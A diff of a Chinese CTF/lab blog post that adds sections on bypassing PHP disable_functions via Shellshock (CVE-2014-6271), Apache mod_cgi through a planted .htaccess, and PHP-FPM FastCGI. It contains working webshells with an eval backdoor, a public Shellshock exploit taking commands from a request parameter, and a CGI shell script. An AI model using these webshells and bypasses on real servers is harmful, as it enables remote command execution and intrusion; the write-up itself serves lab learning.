@@ -38,8 +38,20 @@
 <meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-48-03.png">
 <meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-49-53.png">
 <meta property="og:image" content="http://example.com/images/Snipaste_2025-04-25_21-50-30.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-06-45.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-22-59.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-26-55.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-31-14.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-38-24.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-44-55.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_20-47-25.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_21-03-37.png">
+<meta property="og:image" content="http://example.com/images/image-20250427210757133.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_21-12-19.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_21-32-30.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-27_21-33-43.png">
 <meta property="article:published_time" content="2025-04-25T11:45:43.000Z">
-<meta property="article:modified_time" content="2025-04-25T14:06:29.699Z">
+<meta property="article:modified_time" content="2025-04-27T13:50:33.330Z">
 <meta property="article:author" content="Cnext">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -223,10 +235,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-04-25 19:45:43 / 修改时间：22:06:29" itemprop="dateCreated datePublished" datetime="2025-04-25T19:45:43+08:00">2025-04-25</time>
+              <time title="创建时间：2025-04-25 19:45:43" itemprop="dateCreated datePublished" datetime="2025-04-25T19:45:43+08:00">2025-04-25</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-27 21:50:33" itemprop="dateModified" datetime="2025-04-27T21:50:33+08:00">2025-04-27</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -363,9 +381,95 @@
 <p>选择LD_PRELOAD模式并点击开始按钮，成功后蚁剑会在 <code>/var/www/html</code> 目录里上传一个 <code>.antproxy.php</code> 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 <code>.antproxy.php</code>获得一个新的shell，在这个新shell里面就可以成功执行命令了。要查看flag还是要使用suid提权的命令tac</p>
 <p><img src="/images/Snipaste_2025-04-25_21-49-53.png"></p>
 <p><img src="/images/Snipaste_2025-04-25_21-50-30.png"></p>
+<h5 id="利用shellshock"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#利用shellshock" class="headerlink" title="利用shellshock"></a>利用shellshock</h5><p>利用PHP破壳完成 Bypass</p>
+<p>Bash远程代码执行漏洞(CVE-2014-6271)</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  漏洞原理：</span><br><span class="line">目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/Snipaste_2025-04-27_20-06-45.png"></p>
+<p>如图，环境还是一样的，但是方法变了，老样子，连接蚁剑，然后依旧无法执行命令，php.ini配置如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system</span><br></pre></td></tr></tbody></table></figure>
+
+<p>首先可以使用antsword自带的绕过的方法</p>
 </li>
 </ul>
-</body></html>
+<p>然后直接进终端，查看flag就可以了</p>
+<p><img src="/images/Snipaste_2025-04-27_20-22-59.png"></p>
+<p>首先AntSword 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可，<img src="/images/Snipaste_2025-04-27_20-26-55.png"></p>
+<p><strong>注意1:</strong></p>
+<p>注意看上图中 1 位置的进程树的情况</p>
+<p>如果执行命令直接使用 <code>system</code> 等执行命令的函数, 进程列表是这样的:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data   810   684  0 Jul06 ?        00:00:14 /usr/sbin/apache2 -k start</span><br><span class="line">www-data   909   712  0 00:17 ?        00:00:00 sh -c /bin/sh -c "cd "/var/www/html";ps -aef;echo [S];pwd;echo [E]" 2&gt;&amp;1</span><br><span class="line">www-data   910   909  0 00:17 ?        00:00:00 /bin/sh -c cd /var/www/html;ps -aef;echo [S];pwd;echo [E]</span><br><span class="line">www-data   911   910  0 00:17 ?        00:00:00 ps -aef</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以不明显的（bushi看出本例中执行命令时, 利用了 PHP <code>error_log</code> 函数在执行 <code>sh -c  -t -i </code> 时, Bash 的 ShellShock 漏洞, 从而实现了执行我们自定义命令的目的。/(ㄒoㄒ)/~~</p>
+<p><strong>注意2:</strong></p>
+<p>执行了 <code>ls -al /tmp</code>, 可以看到每次都生成了以 <code>as</code> 开头的临时文件, 这就是我们执行完命令之后, 将输出重定向到了临时文件中, 然后再读出来</p>
+<p>尝试文件管理直接用 PHP 读 flag, 肯定是读不到的</p>
+<p><img src="/images/Snipaste_2025-04-27_20-31-14.png"></p>
+<p>我们就可以直接使用tac去终端里直接查看flag，tac有suid权限</p>
+<p><strong>手动</strong></p>
+<p>有如下几个脚本，挨个解释</p>
+<p>利用error_log函数</p>
+<p>通过查看phpinfo发现没有ban掉error_log</p>
+<p>然后上传脚本</p>
+<p>error_log和mail两个函数，都可以使用，（为了避免ban掉一个）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//默认putenv定义的环境变量名必须以PHP_开头。error_log()函数会在执行sh -c -t -i触发payload</span><br><span class="line">//sh -c -t -i:启动一个Bourne shell，让它执行一个命令字符串（这里没有提供具体的命令字符串），然后输出一个NULL字符并退出，同时保持交互式模式</span><br><span class="line">&lt;?php</span><br><span class="line">  @eval($_REQUEST['ant']);</span><br><span class="line">  putenv("PHP_test=() { :; }; tac /flag &gt;&gt; /var/www/html/test.php");</span><br><span class="line">  error_log("admin",1);</span><br><span class="line">  //mail("admin@localhost","","","","");</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>去test.php下面就有flag了了</p>
+<p><img src="/images/Snipaste_2025-04-27_20-38-24.png"></p>
+<p>然后是另外两个脚本</p>
+<p>首先是antsword官方提供的脚本</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function runcmd($c){</span><br><span class="line">  $d = dirname($_SERVER["SCRIPT_FILENAME"]);</span><br><span class="line">  if(substr($d, 0, 1) == "/" &amp;&amp; function_exists('putenv') &amp;&amp; (function_exists('error_log') || function_exists('mail'))){</span><br><span class="line">    if(strstr(readlink("/bin/sh"), "bash")!=FALSE){</span><br><span class="line">      $tmp=tempnam(sys_get_temp_dir(), 'as');</span><br><span class="line">      putenv("PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1");</span><br><span class="line">      if (function_exists('error_log')) {</span><br><span class="line">        error_log("a", 1);</span><br><span class="line">      }else{</span><br><span class="line">        mail("a@127.0.0.1", "", "", "-bv");</span><br><span class="line">      }</span><br><span class="line">    }else{</span><br><span class="line">      print("Not vuln (not bash)\n");</span><br><span class="line">    }</span><br><span class="line">    $output = @file_get_contents($tmp);</span><br><span class="line">    @unlink($tmp);</span><br><span class="line">    if($output!=""){</span><br><span class="line">      print($output);</span><br><span class="line">    }else{</span><br><span class="line">      print("No output, or not vuln.");</span><br><span class="line">    }</span><br><span class="line">  }else{</span><br><span class="line">    print("不满足使用条件");</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// runcmd("whoami"); // 要执行的命令</span><br><span class="line">runcmd($_REQUEST["cmd"]); // ?cmd=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>还是直接上传到antsword中，然后直接访问这个文件就可以了</p>
+<p>效果如下</p>
+<p><img src="/images/Snipaste_2025-04-27_20-44-55.png"></p>
+<p>第三个脚本</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><br><span class="line"># Google Dork: none </span><br><span class="line"># Date: 10/31/2014 </span><br><span class="line"># Exploit Author: Ryan King (Starfall) </span><br><span class="line"># Vendor Homepage: http://php.net </span><br><span class="line"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><br><span class="line"># Version: 5.* (tested on 5.6.2) </span><br><span class="line"># Tested on: Debian 7 and CentOS 5 and 6 </span><br><span class="line"># CVE: CVE-2014-6271 </span><br><span class="line"></span><br><span class="line">function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 </span><br><span class="line">   $tmp = tempnam(".","data"); </span><br><span class="line">   putenv("PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1"); </span><br><span class="line">   // In Safe Mode, the user may only alter environment variableswhose names </span><br><span class="line">   // begin with the prefixes supplied by this directive. </span><br><span class="line">   // By default, users will only be able to set environment variablesthat </span><br><span class="line">   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span><br><span class="line">   // PHP will let the user modify ANY environment variable! </span><br><span class="line">   mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail</span><br><span class="line">   error_log('a',1);</span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   if($output != "") return $output; </span><br><span class="line">   else return "No output, or not vuln."; </span><br><span class="line">} </span><br><span class="line">echo shellshock($_REQUEST["cmd"]); </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>依旧是直接访问即可，效果如下</p>
+<p><img src="/images/Snipaste_2025-04-27_20-47-25.png"></p>
+<p>注意，直接使用cat等命令还是无法查看，必须要使用类似于tac等能suid提权的命令</p>
+<h5 id="利用-Apache-Mod-CGI"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a>利用 Apache Mod CGI</h5><p>具体走一遍流程吧，蚁剑连接<del>，打开终端</del>，执行命令<del>，欸</del>，执行不了欸~</p>
+<p><img src="/images/Snipaste_2025-04-27_21-03-37.png"></p>
+<p>这里大概给个解释</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CGI：</span><br><span class="line">CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程.</span><br><span class="line">MOD_CGI：</span><br><span class="line">任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>能用蚁剑连，但是/flag 这个文件是 644 权限，www-data （write-write-write)用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 tac 命令(具体看 /start.sh)来获取 flag</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用「绕过 disable_functions」插件, 选择 Apache_mod_cgi 模式进行</span><br><span class="line"></span><br><span class="line">使用条件</span><br><span class="line"></span><br><span class="line">必须是apache环境</span><br><span class="line">mod_cgi已经启用</span><br><span class="line">必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</span><br><span class="line">必须有权限写.htaccess文件</span><br></pre></td></tr></tbody></table></figure>
+
+<p>点击开始按钮之后会直接打开一个新的终端，能直接执行命令了</p>
+<p><img src="/images/image-20250427210757133.png"></p>
+<p><strong>手工</strong></p>
+<p>其实原理就是利用.htaccess</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</span><br><span class="line"></span><br><span class="line">如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</span><br><span class="line">这里的.htaccess文件，将所有.ant后缀的文件作为cgi脚本执行</span><br><span class="line"></span><br><span class="line">Options +ExecCGI #表示允许CGI执行，如果AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了</span><br><span class="line">AddHandler cgi-script .ant #告诉Apache将xx后缀名的文件当作CGI程序进行解析</span><br></pre></td></tr></tbody></table></figure>
+
+<p>再写一个shell.ant文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">echo&amp;&amp;cd "/var/www/html/backdoor";tac /flag;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/Snipaste_2025-04-27_21-12-19.png"></p>
+<p>然后直接访问shell.ant就可以直接执行命令了，改改htaccess文件，什么后缀都可以被当作chi程序解析，但是也是有使用条件的</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用条件</span><br><span class="line"></span><br><span class="line">必须是apache环境</span><br><span class="line">mod_cgi已经启用</span><br><span class="line">必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</span><br><span class="line">必须有权限写.htaccess文件</span><br></pre></td></tr></tbody></table></figure>
+
+<h5 id="PHP-FPM-利用-LD-PRELOAD"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#PHP-FPM-利用-LD-PRELOAD" class="headerlink" title="PHP-FPM 利用 LD_PRELOAD"></a>PHP-FPM 利用 LD_PRELOAD</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正常情况下, PHP-FPM 是不会对外开放的。在有 webshell 之后，这就变得不一样了。学习通过攻击 PHP-FPM 达到 Bypass 的目的。</span><br></pre></td></tr></tbody></table></figure>
+
+<p>前提知识：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php-fpm即php-Fastcgi Process Manager.</span><br><span class="line">php-fpm是 FastCGI 的实现，并提供了进程管理的功能。</span><br><span class="line">进程包含 master 进程和 worker 进程两种进程。</span><br><span class="line">master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</span><br></pre></td></tr></tbody></table></figure>
+
+<p>总结来说php-fpm是一个fastcgi协议解析器，负责按照fastcgi的协议将TCP流解析成真正的数据</p>
+<p>PHP-FPM默认监听9000端口，我们可以自己构造fastcgi协议，和fpm进行通信。于是就有了利用 WebShell 直接与 PHP FastCGI (FPM) 来实现Bypass Disable Functions</p>
+<p>额，具体的流程还是那样，就不过多赘述了，我们直接使用antsword直接绕过吧</p>
+<p>连接蚁剑，使用插件模式选择Fastcgi/PHP-FPM</p>
+<p>注意该模式下需要选择 PHP-FPM 的接口地址, 需要自行找配置文件查 FPM 接口地址, 默认的是 unix:/// 本地 socket 这种的,如果配置成 TCP 的默认是 127.0.0.1:9000，一般默认都是9000端口</p>
+<p><img src="/images/Snipaste_2025-04-27_21-32-30.png"></p>
+<p>直接连接这个php文件，密码还是ant</p>
+<p><img src="/images/Snipaste_2025-04-27_21-33-43.png"></p>
+<p>本例中没有禁止 <code>putenv</code>, 可以用 <code>LD_PRELOAD</code>完成命令执行</p>
+<p>具体操作与 第一个相同, 不再缀述</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">一些疑问和解答</span><br><span class="line">这里由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.</span><br><span class="line">因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信</span><br><span class="line">但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：</span><br><span class="line">1.第一个问题</span><br><span class="line">既然是请求,那么SCRIPT_FILENAME就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.</span><br><span class="line">2.第二个问题</span><br><span class="line">我们再如何构造fastcgi和控制SCRIPT_FILENAME,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.</span><br><span class="line">那要如何绕过这种限制呢? 我们可以从php.ini入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是auto_prepend_file</span><br><span class="line">auto_prepend_file的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.</span><br><span class="line">3.第三个问题</span><br><span class="line">进行过远程文件包含的小伙伴都知道,远程文件包含有allow_url_include这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?</span><br><span class="line">这里,FPM是有设置PHP配置项的KEY-VALUE的,PHP_VALUE可以用来设置php.ini,PHP_ADMIN_VALUE则可以设置所有选项.这样就解决问题了</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第五关还是和第四关一样，都是利用fastcgi攻击php-fpm</p>
+<p>不过多赘述</p>
+<h5 id="Json-Serizlizer-UAF"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#Json-Serizlizer-UAF" class="headerlink" title="Json Serizlizer UAF"></a>Json Serizlizer UAF</h5><h5 id="GC-with-Certain-Destructors-UAF"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#GC-with-Certain-Destructors-UAF" class="headerlink" title="GC with Certain Destructors UAF"></a>GC with Certain Destructors UAF</h5><h5 id="FFI-扩展执行命令"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#FFI-扩展执行命令" class="headerlink" title="FFI 扩展执行命令"></a>FFI 扩展执行命令</h5><h5 id="iconv执行命令"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#iconv执行命令" class="headerlink" title="iconv执行命令"></a>iconv执行命令</h5></body></html>
     </div>
 
     
@@ -445,7 +549,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87Disable-Function%E7%9A%84%E9%99%90%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">绕过Disable_Function的限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">1.0.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.2.</span> <span class="nav-text">常规绕过(黑名单绕过)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.3.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-LD-PRELOAD-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.0.3.0.1.</span> <span class="nav-text">利用 LD_PRELOAD 环境变量</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87Disable-Function%E7%9A%84%E9%99%90%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">绕过Disable_Function的限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">1.0.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.2.</span> <span class="nav-text">常规绕过(黑名单绕过)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.3.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-LD-PRELOAD-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.0.3.0.1.</span> <span class="nav-text">利用 LD_PRELOAD 环境变量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8shellshock"><span class="nav-number">1.0.3.0.2.</span> <span class="nav-text">利用shellshock</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-Apache-Mod-CGI"><span class="nav-number">1.0.3.0.3.</span> <span class="nav-text">利用 Apache Mod CGI</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP-FPM-%E5%88%A9%E7%94%A8-LD-PRELOAD"><span class="nav-number">1.0.3.0.4.</span> <span class="nav-text">PHP-FPM 利用 LD_PRELOAD</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Json-Serizlizer-UAF"><span class="nav-number">1.0.3.0.5.</span> <span class="nav-text">Json Serizlizer UAF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GC-with-Certain-Destructors-UAF"><span class="nav-number">1.0.3.0.6.</span> <span class="nav-text">GC with Certain Destructors UAF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FFI-%E6%89%A9%E5%B1%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.0.3.0.7.</span> <span class="nav-text">FFI 扩展执行命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#iconv%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.0.3.0.8.</span> <span class="nav-text">iconv执行命令</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
